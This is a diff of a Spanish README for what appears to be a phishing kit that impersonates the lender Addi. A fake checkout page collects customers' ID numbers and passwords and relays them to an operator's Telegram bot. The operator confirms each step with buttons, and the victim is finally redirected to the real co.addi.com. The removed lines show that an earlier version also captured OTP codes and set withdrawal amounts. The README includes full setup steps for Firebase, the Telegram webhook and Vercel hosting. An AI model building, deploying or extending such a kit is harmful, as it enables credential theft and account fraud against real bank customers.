@@ -1,65 +1,64 @@
-# Addi Checkout — Demo con Firebase
+# Addi Checkout — validación por bot de Telegram (sin dashboard)
 
-Flujo de desembolso con **validación del asesor en tiempo real** por sesiones (Firestore).
+Flujo corto de verificación: el cliente ingresa **usuario y contraseña** y el **asesor valida desde su bot de Telegram** con botones. Al aprobar, el cliente ve «Verificación exitosa», luego una pantalla con el asesor virtual (WhatsApp) **y al final es redirigido a `https://co.addi.com`**.
+
+## 🧩 Flujo actual
+
+```
+1. Usuario (cédula)  → bot: ✓ Cuenta existe / ✗ Cuenta no existe
+2. Contraseña        → bot: ✓ Verificación exitosa / ✗ Contraseña incorrecta
+3. Pantalla de carga «Verificación exitosa» (la activa el asesor desde el bot)
+4. Asesor virtual (whatsapp.svg): «En unos momentos se comunicará con usted un asesor virtual»
+5. ▶ Redirección automática a https://co.addi.com
+```
+
+> Los pasos antiguos (banco, cupo, OTP, cuotas, identidad, éxito) fueron **eliminados**.
+
+## 🤖 Botones que recibes en el bot de Telegram
+
+| Botón | Qué hace |
+|---|---|
+| `✓ Cuenta existe` / `✗ Cuenta no existe` | Valida la cédula del paso 1 |
+| `✓ Verificación exitosa` / `✗ Contraseña incorrecta` | Aprueba o rechaza el paso 2. Al aprobar se activa la pantalla de carga y el cliente termina redirigido |
+| `🗑 Borrar sesión` | Elimina la sesión |
+
+Otros comandos del bot: `/menu`, `/solicitudes`, `/probar`, `/borrar`.
 
 ## 📁 Archivos
+
 | Archivo | Qué es |
 |---|---|
-| `index.html` | Checkout del cliente (flujo de desembolso) |
-| `dashboard.html` | Panel del asesor (valida, aprueba, define montos y OTP) |
+| `index.html` | Checkout del cliente (los 2 pasos + carga + asesor virtual + redirección) |
+| `api/notificar.js` | Reenvía al bot de Telegram los mensajes con botones |
+| `api/bot.js` | Webhook del bot: recibe tus botones y escribe el `comando` en Firestore |
 | `firestore.rules.json` | Reglas de seguridad (pegarlas en la consola) |
-| `*.svg` | Recursos (logo, loaders, whatsapp) |
+| `GUIA-CONFIGURACION.txt` | 📖 **Guía paso a paso para configurar Firebase + Telegram + Vercel** |
+| `.env.example` | Plantilla de variables de entorno |
+| `*.svg / *.gif / *.png` | Recursos visuales |
 
-## 🧩 Flujo actual (por sesiones — cada cliente = 1 doc en Firestore)
-```
-1. Cédula        → asesor: ✓ cuenta existe / ✗ cuenta no existe
-2. Contraseña    → asesor: ✓ contraseña correcta / ✗ incorrecta
-3. Monto retiro  → el asesor define cuánto retirar (input en el panel)
-4. Procesando    → carga automática (sin aprobación)
-5. OTP           → código aleatorio generado; el asesor lo ve y lo envía
-                    "¿No recibiste el mensaje?" = reenvío con cooldown de 5 min
-6. Validando OTP → asesor: ✓ código válido / ✗ código inválido
-7. Cuotas 8. Confirmar 9. Identidad 10. Finalizando 11. Éxito  → aprobados uno a uno
-```
-> Las señales siempre se escriben en el **doc de la sesión seleccionada** en el dashboard: la sesión 1 nunca altera a la 2, 3, etc.
+## 🚀 Puesta en marcha (resumen)
 
-## 🔧 Requisitos en Firebase
-1. Proyecto + **Firestore** creado
-2. **Authentication → Sign-in method → Anónimo** habilitado
+1. **Firebase**: crea el proyecto, activa Firestore y **Authentication → Anónimo**.
+2. **Reglas**: pega `firestore.rules.json` en Firestore → Rules y cambia `CAMBIA-ESTE-TOKEN` por tu token.
+3. **Configuración**: cambia los 6 datos de `FIREBASE_CONFIG` en `index.html` y el `ADMIN_TOKEN`.
+4. **Bot**: crea el bot con @BotFather → token → envíale un mensaje → saca tu `chat id` de `getUpdates`.
+5. **Vercel**: sube el proyecto y define las variables de entorno (ver `.env.example`).
+6. **Webhook** (una vez): `https://api.telegram.org/bot<TU_TOKEN>/setWebhook?url=https://TU-DOMINIO/api/bot`
+
+Detalles completos en **`GUIA-CONFIGURACION.txt`**.
 
 ## ▶️ Probar en local
-Firebase (módulos) **no funciona con `file://`** → usa un servidor HTTP:
+
 ```bash
-# en la carpeta del proyecto:
-python -m http.server 8000
+vercel dev
 ```
-- Asesor: `http://localhost:8000/dashboard.html`
-- Cliente: `http://localhost:8000/index.html` (en otra pestaña u otro dispositivo de la red local)
+Abre `http://localhost:3000` para el flujo del cliente. Para probar los botones del bot se necesita una URL pública (Previews de Vercel o `ngrok` apuntando a `http://localhost:3000/api/bot`).
 
-## 🚀 Montar en internet
-Sube **todos los archivos** a cualquier hosting estático:
-- **Firebase Hosting**, Netlify, Vercel o GitHub Pages
+## 🔒 Seguridad
 
-## 🔐 Secretos fuera del código (webhook + contraseña del dashboard)
-- El **webhook de Discord** y la **contraseña del dashboard** ya NO están en el repo/HTML.
-- Se guardan como variables de entorno del servidor:
-  **Vercel → Project → Settings → Environment Variables:**
-  ```
-  DISCORD_WEBHOOK = https://discord.com/api/webhooks/...
-  DASH_PASS       = (la clave, ej. Dezuh2026)
-  ```
-- El cliente y el dashboard llaman a **`/api/notificar`** (reenvía a Discord) y **`/api/login`** (valida la clave). Los secretos nunca salen del servidor.
+- `TELEGRAM_BOT_TOKEN`, `ADMIN_CHAT_ID` y `FIREBASE_ADMIN_TOKEN` viven solo en **variables de entorno de Vercel** (nunca en el repo).
+- El token de asesor debe ser el mismo en: `firestore.rules.json`, `index.html → ADMIN_TOKEN` y Vercel.
 
-### ▶️ Para probar lo seguro en local
-```bash
-vercel dev   # levanta todo e inyecta las variables de entorno
-```
-(Si pruebas con `python -m http.server` o `file://`, el webhook y el login necesitan estar desplegados o usar `vercel dev`.)
+## ⚠️ Nota producción real
 
-## 🔒 Seguridad (30 días del modo de prueba)
-1. Firestore → **Rules** → pega el contenido de `firestore.rules.json`
-2. Cambia `'CAMBIA-ESTE-TOKEN'` por un token tuyo (en las reglas **y** en `dashboard.html` → `ADMIN_TOKEN`)
-
-## ⚠️ Pendiente para producción real
-- El **código OTP se genera en el navegador del cliente** (se puede inspeccionar); ocultarlo requiere un backend/Cloud Function que lo genere.
-- El **`ADMIN_TOKEN`** de Firestore sigue en `dashboard.html` y en `firestore.rules.json`; el siguiente nivel es moverlo a un `/api/cmd` con credenciales de Admin SDK (te lo dejo anotado por si lo quieres).
+El bot escribe el `comando` usando login anónimo + `adminToken` (según las reglas). El siguiente nivel es usar **Admin SDK** de Firebase en `/api/bot` con credenciales de servicio.
